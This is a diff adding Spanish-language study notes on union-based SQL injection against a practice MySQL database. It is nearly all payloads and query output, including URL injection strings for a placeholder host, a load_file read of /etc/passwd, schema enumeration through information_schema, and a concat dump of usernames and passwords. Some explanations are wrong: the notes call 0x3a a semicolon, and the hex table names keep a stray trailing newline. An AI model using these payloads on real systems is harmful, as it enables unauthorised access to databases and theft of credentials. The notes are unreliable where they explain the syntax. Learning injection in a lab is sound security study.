@@ -1,0 +1,70 @@
+
+::: select * from Alumnos where id = 1 order by 100;#;
+::: select * from Alumnos where id = 1 order by 100;-- -;
+      ERROR 1054 (42S22): Unknown column '100' in 'order clause'
+
+      ;#;  ===  ;-- -;       ##!! tenemos que comentar el resto de la sentencia sql (comentar el resto de la query) para que no nos de error.
+
+    :: select * from Alumnos where id = 1 order by 50;-- -;
+      ERROR 1054 (42S22): Unknown column '50' in 'order clause'
+
+::: select * from Alumnos where id = 1 order by 4;-- -;  
+      +------+---------------+------------+-----------+
+      | id   | username      | password   | contacto  |
+      +------+---------------+------------+-----------+
+      |    1 | administrator | admin123$! | 616123456 |
+      +------+---------------+------------+-----------+
+
+::: select * from Alumnos where id = 1 union select 1,2,3,4;-- -;
+ ::http://ipHere:puertoHere/complain//view.php?mod=admin&view=repod*id=plans union select 1,2,3,4,5-- -
+    +------+---------------+------------+-----------+
+    | id   | username      | password   | contacto  |
+    +------+---------------+------------+-----------+
+    |    1 | administrator | admin123$! | 616123456 |
+    |    1 | 2             | 3          | 4         |
+    +------+---------------+------------+-----------+
+
+   ::http://ipHere:puertoHere/complain//view.php?mod=admin&view=repod*id=plans union select 1,database(),3,4,5-- -
+   ::http://ipHere:puertoHere/complain//view.php?mod=admin&view=repod*id=plans union select 1,user(),3,4,5-- -
+
+
+::: select * from Alumnos where id = 1 union select 1,load_file('/etc/passwd'),3,4,5;-- -;
+
+::: select * from Alumnos where id = 1 union select 1,schema_name,3,4 from information_schema.schemata;-- -;
+
+      {
+          schema_name    #! es para referenciar a la base de datos
+          from information_schema.schemata      #! query en sql, en el campo 2 mostrar todos los nombres de las bases de datos disponibles
+      } === los mismo que :::show databases;  , pero esto es una injecci[on sql :)
+
+
+::: select * from Alumnos where id = 1 union select 1,schema_name,3,4 from information_schema.schemata limit 1,1;-- -;
+            limit 1,1       #! query para limitar a una posici[on especifica
+            limit 2,1   limit 3,1 etc...
+
+
+
+
+::: select * from Alumnos where id = 1 union select 1,table_name,3,4 from information_schema.tables where table_schema = "Colegio";-- -;
+
+
+
+::: select * from Alumnos where id = 1 union select 1,column_name,3,4 from information_schema.columns where table_schema = "Colegio" and table_name ="Alumnos" limit 1,1;-- -;
+
+              ..... from information_schema.columns where table_schema = "Colegio" and table_name ="Alumnos" limit 2,1;-- -;     .... limit 3,1;-- -;  .... limit 4,1;#;
+
+
+::: select * from Alumnos where id = 1 union select 1,column_name,3,4 from information_schema.columns where table_schema = "436f6c6567696f" and table_name ="416c756d6e6f73" limit 1,1;-- -;
+
+      echo "Colegio" | xxd -ps  ==>  436f6c6567696f0a
+      echo "Alumnos" | xxd -ps  ==>  416c756d6e6f730a
+
+
+
+::: select * from ....... union select 1,concat(username,0x3a,password),3,4 from Colegio.Alumnos;-- -;
+
+    concat()   #! concatena 2 valores
+    0x3a       #! ';' en hexadecimal
+    Colegio.Alumnos   #! baseDeDatos Colegio   Tabla Alumnos
+
+
